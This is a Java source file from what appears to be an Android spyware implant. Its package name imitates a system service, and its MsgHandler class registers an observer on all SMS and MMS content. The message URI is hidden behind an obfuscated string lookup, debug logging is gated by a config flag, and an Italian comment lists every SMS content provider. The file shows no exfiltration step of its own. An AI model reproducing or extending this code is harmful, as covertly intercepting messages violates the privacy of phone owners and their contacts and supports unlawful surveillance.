package com.android.service.module.message;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class MsgHandler extends Thread {
	private static final String TAG = "SmsHandler"; //$NON-NLS-1$

	private Handler handler;

	// private ContentObserver smsObserver;
	// private ContentObserver mmsObserver;
	private ContentObserver msgObserver;

	private boolean smsEnabled;

	private boolean mmsEnabled;

	public MsgHandler(boolean smsEnabled, boolean mmsEnabled) {
		this.smsEnabled = smsEnabled;
		this.mmsEnabled = mmsEnabled;
	}

	@Override
	public void run() {
		Looper.prepare();

		handler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				// process incoming messages here
				if (Cfg.DEBUG) {
					Check.log(TAG + " (handleMessage): " + msg);
				}
			}
		};

		final ContentResolver cr = Status.getAppContext().getContentResolver();

		/*
		 * I possibili content resolver sono Inbox = "content://sms/inbox"
		 * Failed = "content://sms/failed" Queued = "content://sms/queued" Sent
		 * = "content://sms/sent" Draft = "content://sms/draft" Outbox =
		 * "content://sms/outbox" Undelivered = "content://sms/undelivered" All
		 * = "content://sms/all" Conversations = "content://sms/conversations"
		 * All Conversations = "content://mms-sms/conversations" All messages =
		 * "content://mms-sms" All SMS = "content://sms"
		 */

		// content://sms
		// Messages.getString("25.0") : "content://sms"

		// M.1=content://mms-sms
		msgObserver = new MsgObserver(handler, mmsEnabled, smsEnabled);
		cr.registerContentObserver(Uri.parse(Messages.getString("M.1")), true, msgObserver); //$NON-NLS-1$

		Looper.loop();
	}

	public void quit() {
		if (handler != null) {
			handler.getLooper().quit();
		}
	}
}
